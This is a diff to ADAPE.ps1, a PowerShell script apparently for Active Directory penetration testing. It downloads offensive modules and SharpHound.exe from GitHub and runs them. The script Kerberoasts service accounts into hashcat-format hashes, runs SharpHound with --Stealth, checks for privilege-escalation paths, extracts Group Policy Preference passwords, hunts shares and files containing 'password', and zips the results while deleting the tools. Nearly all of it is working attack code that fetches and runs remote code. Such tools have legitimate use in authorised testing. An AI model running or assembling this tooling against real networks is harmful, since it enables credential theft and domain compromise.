Combined scripts

+++ ADAPE.ps1
@@ -1,6 +1,6 @@
 Write-Host "###########################################################################################################" -ForegroundColor Green
 Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.2                                    ##" -ForegroundColor Green
-Write-Host "##   Developed By Hausec                                                                                 ##" -ForegroundColor Green
+Write-Host "##   Developed By @Haus3c                                                                                 ##" -ForegroundColor Green
 Write-Host "##                                                                                                       ##" -ForegroundColor Green
 Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
 Write-Host "##                                                                                                       ##" -ForegroundColor Green
@@ -24,51 +24,82 @@ If(!(test-path $path))
 }
 else
 {
-	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
+	Write-Host 	"Failed to create the capture folder, does it already exist?" -ForegroundColor Red
 }
 $modules = split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
 $client = New-Object System.Net.WebClient
-#specify modules folder
+$ErrorActionPreference= 'silentlycontinue'
 $modulepath=$env:psmodulepath.split(';')[0].split(' ')
 Write-Host "Using Module path: $modulepath" -ForegroundColor Green
-#create kerberoast PS module folder
+#Kerberoast
 If(!(test-path $modulepath/Kerberoast))
 {
       New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
 }
-#download Kerberoast
 Write-Host "Fetching Kerberoast module..."
-If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" -WarningAction silentlyContinue)
-{
 $client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
+If (Test-Path $modulepath/Kerberoast/Kerberoast.psm1 -PathType Leaf)
+{
+	Write-Host "Download Successful"
+	Import-Module Kerberoast.psm1
+	Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
+	Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
 }
 else
 {
 	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
 	Copy-Item "$modules/Invoke-Kerberoast.ps1" -Destination "$modulepath/Kerberoast/Kerberoast.psm1"
+		If (Test-Path $modulepath/Kerberoast/Kerberoast.psm1 -PathType Leaf)
+			{
+				Write-Host "Copy Successful"
+				Import-Module Kerberoast.psm1
+				Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
+				Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
+			}
+		else
+			{
+				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
+			}
 }
-#Run Kerberoast
-Write-Host "Importing module..." 
-Import-Module Kerberoast.psm1
-Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
-Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
+
 
 #BloodHound Powershell Method -- Try this if .Exe is picked up by AV. 
-<#
+<# 
 If(!(test-path $modulepath/Sharp))
 {
       New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
 }
-Write-Host "Fetching SharpHound module..." 
+Write-Host "Fetching BloodHound module..."
 $download = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/1.5/Ingestors/SharpHound.ps1")
 $Encode = [System.Text.Encoding]::Unicode.GetBytes(($download))
 $Base64 = [Convert]::ToBase64String($Encode)
 $Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Base64))
 $Decoded > $modulepath/Sharp/Sharp.psm1
-Write-Host "Importing module..." 
-Import-Module Sharp.psm1
-Write-Host "Running SharpHound" -ForegroundColor  Yellow
-Invoke-BloodHound -CSVFolder $path | Out-Null
+If (Test-Path $modulepath/Sharp/Sharp.psm1 -PathType Leaf)
+{
+	Write-Host "Download Successful" 
+	Write-Host "Importing module..." 
+	Import-Module Sharp.psm1
+	Write-Host "Running SharpHound" -ForegroundColor  Yellow
+	Invoke-BloodHound -CSVFolder $path | Out-Null
+}
+else
+{
+	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
+	Copy-Item "$modules/SharpHound.ps1" -Destination "$modulepath/Sharp/Sharp.psm1"
+		If (Test-Path $modulepath/Sharp/Sharp.psm1 -PathType Leaf)
+		{
+			Write-Host "Copy Successful" 
+			Write-Host "Importing module..." 
+			Import-Module Sharp.psm1
+			Write-Host "Running SharpHound" -ForegroundColor  Yellow
+			Invoke-BloodHound -CSVFolder $path | Out-Null
+		}
+		else
+			{
+				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
+			}
+}
 #>
 
 #BloodHound EXE method
@@ -76,19 +107,31 @@ If(!(test-path $modulepath/Sharp))
 {
       New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
 }
+
 Write-Host "Fetching Sharphound.exe..."
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-If(Test-NetConnection -ComputerName "https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true" -WarningAction silentlyContinue)
-{
 $client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
+If (Test-Path $modulepath/Sharp/Sharp.exe -PathType Leaf)
+{
+	Write-Host "Download Successful" 
+	Write-Host "Running SharpHound" -ForegroundColor  Yellow
+	& "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path
 }
 else
 {
 	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
-	Copy-Item "$modules/Sharphound.exe" -Destination "$modulepath/Sharp"
+	Copy-Item "$modules/Sharphound.exe" -Destination "$modulepath/Sharp/Sharp.exe"
+		If (Test-Path $modulepath/Sharp/Sharp.exe -PathType Leaf)
+			{
+				Write-Host "Copy Successful" 
+				Write-Host "Running SharpHound" -ForegroundColor  Yellow
+				& "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path
+			}
+		else
+			{
+				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
+			}
 }
-Write-Host "Running SharpHound" -ForegroundColor  Yellow
-& "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path
 
 #PrivEsc
 If(!(test-path $modulepath/PrivEsc))
@@ -96,42 +139,62 @@ If(!(test-path $modulepath/PrivEsc))
       New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
 }
 Write-Host "Fetching PowerUp module..."
-If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -WarningAction silentlyContinue)
-{
+
 $client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","$modulepath/PrivEsc/PrivEsc.psm1")
+If (Test-Path $modulepath/PrivEsc/PrivEsc.psm1 -PathType Leaf)
+{
+	Write-Host "Download Successful" 
+	Import-Module PrivEsc.psm1
+	Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
+	Invoke-AllChecks | Out-File $path\PrivEsc.txt
 }
 else
 {
 	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
 	Copy-Item "$modules/PowerUp.ps1" -Destination "$modulepath/PrivEsc/PrivEsc.psm1"
+		If (Test-Path $modulepath/PrivEsc/PrivEsc.psm1 -PathType Leaf)
+			{
+				Write-Host "Copy Successful" 
+				Import-Module PrivEsc.psm1
+				Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
+				Invoke-AllChecks | Out-File $path\PrivEsc.txt
+			}
+		else
+			{
+				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
+			}
 }
-Write-Host "Importing module..."
-Import-Module PrivEsc.psm1
-Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
-Invoke-AllChecks | Out-File $path\PrivEsc.txt
-
-#create GPP PS module folder
+#GPP Password check
 If(!(test-path $modulepath/GPP))
 {
       New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
 }
-#check for GPP passwords
 Write-Host "Fetching GPPP module..." 
-If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1" -WarningAction silentlyContinue)
-{
+
 $client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.psm1")
+If (Test-Path $modulepath/GPP/GPP.psm1 -PathType Leaf)
+{
+	Write-Host "Download Successful" 
+	Import-Module GPP.psm1
+	Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
+	Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
 }
 else
 {
 	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
 	Copy-Item "$modules/Get-GPPPassword.ps1" -Destination "$modulepath/GPP/GPP.psm1"
+		If (Test-Path $modulepath/GPP/GPP.psm1 -PathType Leaf)
+			{
+				Write-Host "Copy Successful" 
+				Import-Module GPP.psm1
+				Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
+				Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
+			}
+		else
+			{
+				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
+			}
 }
-#import module
-Write-Host "Importing module..." 
-Import-Module GPP.psm1
-#Run GPP. Verbose enabled so you know it's actually working or not
-Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
-Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
 
 #PowerView
 If(!(test-path $modulepath/PowerView))
@@ -139,25 +202,43 @@ If(!(test-path $modulepath/PowerView))
       New-Item -ItemType Directory -Force -Path $modulepath/PowerView | Out-Null
 }
 Write-Host "Fetching PowerView module..." 
-If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -WarningAction silentlyContinue)
-{
+
 $client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1","$modulepath/PowerView/PowerView.psm1")
+If (Test-Path $modulepath/PowerView/PowerView.psm1 -PathType Leaf)
+{
+	Write-Host "Download Successful" 
+	Write-Host "Importing module..."
+	Import-Module PowerView.psm1
+	Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
+	Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
+	Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
+	#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
+	Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
+	Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
+	Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
 }
 else
 {
 	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
 	Copy-Item "$modules/PowerView.ps1" -Destination "$modulepath/PowerView/PowerView.psm1"
-
+		If (Test-Path $modulepath/PowerView/PowerView.psm1 -PathType Leaf)
+			{
+				Write-Host "Copy Successful" 
+				Write-Host "Importing module..."
+				Import-Module PowerView.psm1
+				Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
+				Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
+				Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
+				#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
+				Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
+				Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
+				Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
+			}
+		else
+			{
+				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
+			}
 }
-Write-Host "Importing module..."
-Import-Module PowerView.psm1
-Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
-Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
-Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
-#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
-Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
-Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
-Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
 
 #Zip it all up and remove leftovers
 Compress-Archive -Path $path -Update -DestinationPath C:\Capture.zip
@@ -165,5 +246,6 @@ Remove-Item -Recurse -Force "$modulepath/Kerberoast"
 Remove-Item -Recurse -Force "$modulepath/PrivEsc"
 Remove-Item -Recurse -Force "$modulepath/Sharp"
 Remove-Item -Recurse -Force "$modulepath/PowerView"
+Remove-Item -Recurse -Force "$modulepath/GPP"							
 Remove-Item -Recurse -Force $path
 Write-Host "Done! Results stored in the Capture.zip file!" -ForegroundColor Green
